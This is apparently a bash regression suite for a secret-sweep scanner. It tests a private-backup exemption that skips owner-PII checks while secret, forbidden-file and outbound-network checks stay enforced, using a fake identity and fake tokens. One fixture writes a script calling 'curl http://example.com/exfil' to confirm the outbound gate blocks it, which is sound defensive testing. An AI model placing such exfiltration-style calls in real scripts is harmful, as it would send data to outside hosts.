#!/bin/bash
# dgn808_private_backup_exemption_selftest.sh -- DGN-808 regression suite.
#
# Verifies the private owner-backup exemption in scripts/secret-sweep.sh:
#   - a valid repo-root `.dogany-private-backup` declaration skips owner-PII
#     cats {2,3,4,5,9} while cats {1,6,7,8} stay enforced;
#   - every failure direction is CLOSED (missing/malformed/unreadable marker,
#     marker-as-directory, repo shipping scripts/publish.sh -> full sweep);
#   - --staged honors the exemption; --outbound-diff (D7) is unaffected.
#
# All fixtures use a FAKE test identity (no real owner PII). Exit 0 = all pass.
set -u

REPO_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
SWEEP="$REPO_ROOT/scripts/secret-sweep.sh"
BASE="$(mktemp -d /tmp/dgn808-selftest.XXXXXX)"
trap 'rm -rf "$BASE"' EXIT

[ -x "$SWEEP" ] || { echo "FATAL: sweep not found/executable: $SWEEP"; exit 2; }

PASS=0; FAIL=0; RESULTS=""
note() { RESULTS="${RESULTS}$1"$'\n'; }

# mk_repo <name>: git repo with fake-owner identity file + PII fixture file.
mk_repo() {
  local d="$BASE/$1"
  mkdir -p "$d"; cd "$d" || exit 9
  git init -q -b main .
  git config user.name "Testy Owner"
  git config user.email "testowner@fakehost.local"
  # untracked machine-local identity (activates cats 2-5 + cat9 owner part)
  cat > .sweep-identity <<'EOF'
SWEEP_OWNER_TG_ID='1234567890'
SWEEP_OWNER_EMAIL_PAT='testowner@example\.com'
SWEEP_OWNER_NAME_PAT='Testy Owner'
SWEEP_MACHINE_PATH='/Users/testowner'
SWEEP_OWNER_IDENT_PAT='Testy Owner|testowner'
EOF
  echo ".sweep-identity" > .gitignore
  # PII fixture: trips cats 2,3,4,5
  cat > pii.md <<'EOF'
tg id: 1234567890
mail: testowner@example.com
name: Testy Owner
path: /Users/testowner/dogany/data
EOF
  git add .gitignore pii.md
  git commit -qm "fixture: pii content" >/dev/null
  cd - >/dev/null || exit 9
}

valid_marker() {
  cat > "$BASE/$1/.dogany-private-backup" <<'EOF'
# This repo is a PRIVATE single-owner backup mirror (DGN-808).
declare: private-owner-backup
EOF
}

run_case() {  # $1=case-id $2=repo $3=expected-exit $4=grep-must $5=grep-mustnot
  local id="$1" repo="$BASE/$2" want="$3" must="$4" mustnot="$5"
  local out rc=0
  out="$("$SWEEP" "$repo" 2>&1)" || rc=$?
  local ok=1
  [ "$rc" != "$want" ] && ok=0
  if [ -n "$must" ] && ! printf '%s' "$out" | grep -q "$must"; then ok=0; fi
  if [ -n "$mustnot" ] && printf '%s' "$out" | grep -q "$mustnot"; then ok=0; fi
  if [ "$ok" = "1" ]; then
    PASS=$((PASS+1)); note "PASS  $id (exit=$rc)"
  else
    FAIL=$((FAIL+1)); note "FAIL  $id (exit=$rc want=$want)"
    printf '===== %s output =====\n%s\n\n' "$id" "$out" >> "$BASE/fail.log"
  fi
}

# --- A: marker + PII-only -> CLEAN (cats 2-5,9 exempted) ---------------------
mk_repo A; valid_marker A
run_case "A  marker, cats2-5+9 hits only -> CLEAN" A 0 "exemption ACTIVE" "cat[2-59]"

# --- B: marker + cat7 env-secret -> still DIRTY cat7 only --------------------
mk_repo B; valid_marker B
cd "$BASE/B"; printf 'API_TOKEN=realsecret12345678\n' > deploy.conf
git add deploy.conf; git commit -qm "cat7 fixture" >/dev/null; cd - >/dev/null
run_case "B  marker, cat7 hit -> BLOCK cat7" B 1 "cat7 env-secret-line" "cat[2345] "

# --- C: marker + tracked .env + raw .db -> still DIRTY cat8 ------------------
mk_repo C; valid_marker C
cd "$BASE/C"; printf 'x=1\n' > .env; printf 'BIN' > lifekit.db
git add -f .env lifekit.db; git commit -qm "cat8 fixture" >/dev/null; cd - >/dev/null
run_case "C  marker, cat8 tracked .env/.db -> BLOCK cat8" C 1 "cat8 forbidden-tracked-file" ""

# --- D: marker + cat1 tg-token + cat6 generic key -> still DIRTY -------------
mk_repo D; valid_marker D
cd "$BASE/D"
printf 'bot: 123456789:AAHfakefakefakefakefakefakefakefake9\n' > tok.txt
printf 'key: ghp_abcdefghijklmnopqrstuv0123456789\n' >> tok.txt
git add tok.txt; git commit -qm "cat1+6 fixture" >/dev/null; cd - >/dev/null
run_case "D  marker, cat1+cat6 hits -> BLOCK" D 1 "cat1 telegram-token" ""

# --- E: NO marker -> full sweep regression (cats 2-5,9 all fire) -------------
mk_repo E
run_case "E  no marker -> full sweep DIRTY (regression)" E 1 "cat2 owner-tg-id" "exemption ACTIVE"

# --- F: malformed marker content -> fail-closed full sweep + warning ---------
mk_repo F
printf 'private backup pls\n' > "$BASE/F/.dogany-private-backup"
run_case "F  malformed marker -> REFUSED + full sweep" F 1 "Exemption REFUSED" "exemption ACTIVE"

# --- G: unreadable marker -> fail-closed full sweep --------------------------
# (skipped when running as root: chmod 000 does not block root reads)
if [ "$(id -u)" != "0" ]; then
  mk_repo G; valid_marker G; chmod 000 "$BASE/G/.dogany-private-backup"
  run_case "G  unreadable marker -> REFUSED + full sweep" G 1 "Exemption REFUSED" "exemption ACTIVE"
  chmod 644 "$BASE/G/.dogany-private-backup"
fi

# --- H: marker on repo shipping scripts/publish.sh -> REFUSED ----------------
mk_repo H; valid_marker H
mkdir -p "$BASE/H/scripts"; printf '#!/bin/bash\n' > "$BASE/H/scripts/publish.sh"
run_case "H  marker + publish.sh -> REFUSED + full sweep" H 1 "public-export path" "exemption ACTIVE"

# --- I: marker is a directory -> fail-closed ---------------------------------
mk_repo I; mkdir "$BASE/I/.dogany-private-backup"
run_case "I  marker-as-directory -> REFUSED + full sweep" I 1 "Exemption REFUSED" "exemption ACTIVE"

# --- J: marker with leading comments/blanks -> ACTIVE ------------------------
mk_repo J
printf '# comment\n\n   \ndeclare: private-owner-backup\n' > "$BASE/J/.dogany-private-backup"
run_case "J  marker w/ comments+blanks -> ACTIVE, CLEAN" J 0 "exemption ACTIVE" ""

# --- K: staged mode honors exemption -----------------------------------------
mk_repo K; valid_marker K
cd "$BASE/K"; printf 'more pii: testowner@example.com Testy Owner\n' > staged.md
git add staged.md; cd - >/dev/null
rcK=0; outK="$("$SWEEP" --staged "$BASE/K" 2>&1)" || rcK=$?
if [ "$rcK" = "0" ] && printf '%s' "$outK" | grep -q "exemption ACTIVE"; then
  PASS=$((PASS+1)); note "PASS  K  --staged mode, marker -> CLEAN (exit=0)"
else
  FAIL=$((FAIL+1)); note "FAIL  K  --staged mode (exit=$rcK)"
  printf '===== K output =====\n%s\n' "$outK" >> "$BASE/fail.log"
fi

# --- L: D7 outbound-diff UNAFFECTED by marker --------------------------------
mk_repo L; valid_marker L
cd "$BASE/L"
BASE_SHA="$(git rev-parse HEAD)"
printf '#!/bin/bash\ncurl http://example.com/exfil\n' > net.sh
git add net.sh; git commit -qm "outbound fixture" >/dev/null; cd - >/dev/null
rcL=0; outL="$("$SWEEP" --outbound-diff "$BASE_SHA" "$BASE/L" 2>&1)" || rcL=$?
if [ "$rcL" = "1" ] && printf '%s' "$outL" | grep -q "D7-BLOCKED"; then
  PASS=$((PASS+1)); note "PASS  L  --outbound-diff w/ marker -> still D7-BLOCKED"
else
  FAIL=$((FAIL+1)); note "FAIL  L  --outbound-diff (exit=$rcL)"
  printf '===== L output =====\n%s\n' "$outL" >> "$BASE/fail.log"
fi

# --- M: marker + instance-style cat7 test fixture -> still trips cat7 --------
# Apply-side note (DGN-808): instance repos handle such synthetic fixtures via
# their own .sweepignore; the exemption itself must NOT silence cat7.
mk_repo M; valid_marker M
cd "$BASE/M"; mkdir -p routines/tests
printf 'TELEGRAM_TOKEN=fake:token123456\n' > routines/tests/test-push-retry.sh
git add routines/tests/test-push-retry.sh; git commit -qm "fixture" >/dev/null
cd - >/dev/null
run_case "M  marker, instance-style cat7 fixture -> BLOCK cat7" M 1 "cat7 env-secret-line" ""

# --- N: template + hook integration -- real push through pre-push gate -------
git init -q --bare "$BASE/remote.git"
mk_repo N; valid_marker N
cd "$BASE/N"
mkdir -p scripts git-hooks
cp "$REPO_ROOT/agents/.template/scripts/secret-sweep.sh" scripts/
cp "$REPO_ROOT/agents/.template/git-hooks/pre-push" git-hooks/
chmod +x scripts/secret-sweep.sh git-hooks/pre-push
git config core.hooksPath git-hooks
git remote add origin "$BASE/remote.git"
git add .dogany-private-backup scripts git-hooks
git commit -qm "gate wiring" >/dev/null
if git push -q origin HEAD >/dev/null 2>&1; then
  PASS=$((PASS+1)); note "PASS  N1 pre-push: marker+PII push allowed"
else
  FAIL=$((FAIL+1)); note "FAIL  N1 pre-push: marker+PII push blocked"
fi
printf 'API_TOKEN=realsecret12345678\n' > deploy.conf
git add deploy.conf; git commit -qm "cat7" >/dev/null
if git push -q origin HEAD >/dev/null 2>&1; then
  FAIL=$((FAIL+1)); note "FAIL  N2 pre-push: cat7 push went through"
else
  PASS=$((PASS+1)); note "PASS  N2 pre-push: cat7 push blocked"
fi
cd - >/dev/null

# --- O: defect1 regression -- tracked publish.sh deleted from working-tree ----
# A repo that has scripts/publish.sh committed to git (index) must have its
# exemption REFUSED even if publish.sh is removed in the working tree before
# the sweep runs. The old -e check allowed this bypass; the new index check
# (git ls-files --error-unmatch) must catch it.
mk_repo O; valid_marker O
cd "$BASE/O"
mkdir -p scripts; printf '#!/bin/bash\n' > scripts/publish.sh
git add scripts/publish.sh; git commit -qm "add tracked publish.sh" >/dev/null
rm scripts/publish.sh   # delete from working-tree WITHOUT committing the deletion
cd - >/dev/null
run_case "O  defect1: tracked publish.sh rm -> exemption REFUSED (index check)" O 1 "public-export path" "exemption ACTIVE"

# --- P: defect3 (hardening) -- marker as symlink -> REFUSED -------------------
mk_repo P
printf 'declare: private-owner-backup\n' > "$BASE/valid_target_marker"
ln -s "$BASE/valid_target_marker" "$BASE/P/.dogany-private-backup"
run_case "P  defect3: marker is a symlink -> REFUSED + full sweep" P 1 "symlink" "exemption ACTIVE"

# --- Q: defect2 regression -- subdirectory marker in sweep repo ---------------
# publish.sh gate3 used to check only $SWEEP_REPO/.dogany-private-backup (root).
# A marker at agents/.template/.dogany-private-backup inside the export tree
# would have been missed. Test that the sweep script itself (invoked on a tree
# containing a subdir marker) refuses the exemption (full sweep still blocks PII).
mk_repo Q
mkdir -p "$BASE/Q/agents/.template"
printf 'declare: private-owner-backup\n' > "$BASE/Q/agents/.template/.dogany-private-backup"
cd "$BASE/Q"
git add agents/.template/.dogany-private-backup; git commit -qm "subdir marker" >/dev/null
cd - >/dev/null
# Q has NO root marker, so the exemption is not active; the subdir marker file
# itself is just a tracked file. The sweep must run FULL and block on the PII
# from mk_repo (cats 2-5); the subdir marker must NOT activate the exemption.
run_case "Q  defect2: subdir .dogany-private-backup does not activate exemption" Q 1 "cat2 owner-tg-id" "exemption ACTIVE"

echo "==============================================="
printf '%s' "$RESULTS"
echo "==============================================="
echo "TOTAL: pass=$PASS fail=$FAIL"
[ -s "$BASE/fail.log" ] && { echo "--- fail detail ---"; cat "$BASE/fail.log"; }
[ "$FAIL" = "0" ]
